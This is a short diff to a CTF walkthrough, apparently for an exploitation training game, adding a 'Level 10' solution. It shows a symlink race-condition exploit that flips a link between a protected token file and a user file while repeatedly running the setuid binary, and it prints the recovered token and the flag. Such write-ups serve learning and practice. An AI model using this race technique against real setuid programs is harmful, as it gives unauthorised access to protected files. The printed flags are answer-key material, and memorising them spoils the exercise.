@@ -174,3 +174,17 @@ $ ./level09 /tmp/res
 	<summary>Flag:</summary>
 	s5cAJpM8ev6XHw998pRWG728z
 </details>
+
+
+# Level 10
+
+```sh
+$ while true; do ln -sf /home/user/level10/token /tmp/mykey; ln -sf /tmp/test /tmp/mykey; done &
+$ for i in {1..1000}; do /home/user/level10/level10 /tmp/mykey 127.0.0.1; done
+```
+clef flag10: woupa2yuojeeaaed06riuj63c
+
+<details>
+	<summary>Flag:</summary>
+	feulo4b72j7edeahuete3no7c
+</details>
